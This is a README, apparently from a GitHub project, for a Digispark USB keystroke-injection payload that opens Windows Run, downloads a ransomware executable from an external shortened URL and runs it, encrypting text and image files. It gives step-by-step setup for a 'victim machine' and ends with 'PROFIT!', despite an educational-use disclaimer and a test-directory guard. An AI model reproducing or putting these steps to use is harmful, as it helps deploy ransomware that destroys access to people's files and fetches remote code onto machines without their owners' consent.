**EDUCATIONAL USE ONLY, USE AT YOUR OWN RISK!**
# Digispark - Ransomware
For more details, see our [documentations](/documentation/conops_ransomware.md).

Opens up Run in Windows.   
Using keystroke injections:   
- Downloads the ransomware executable, from user defined location.   
- Executes it, and the executable encrypts .txt, .jpg, .jpeg, .png files in the directory, it is downloaded to.

Check out more detailed usage of the [Ransomware in our project.](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/ransomware)

## How to use:

*Designed, using Finnish keyboard in victim machine.*     
- Check [DigiKeyboardFi](https://github.com/therealhalonen/DigiKeyboardFi) for support it.    
- Download the .ino, or copy the code.    
- Open the file or paste the content to/in Arduino IDE.
- Define:
	-  `DownloadFile('URL_WHERE_TO_DOWNLOAD'`    
	**NOTE: As is (`https://tinyurl.com/28sb6pvc`), it downloads it from [here](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/ransomware/Python%20app)**   
	
	- Path, where to download and what to execute (both must be the same):
		- `$env:UserProfile/TestDirz338/malware.exe\\\`
	- Working Dir:
		- `-WorkingDir \\\"$env:UserProfile/TestDirz338\\\`
- Please note, that we don't recommend blindly using our tinyurl. Make your own URL and .exe to be safe!
- Upload to Digispark
- Make a directory named `TestDirz338` in the User-directory of the target machine. The directory name IS case sensitive and the directory needs to be in the correct directory for the ransomware to work. Or adjust the code to suit your test environment.
- Plug the Digispark in to the target machine
- **PROFIT!**

---
**Note:**  
Folder:
- [old](https://github.com/therealhalonen/PhishSticks/tree/master/digispark/digispark_ransomware/old)
    - Older draft to initially getting the ransomware with Digispark to work
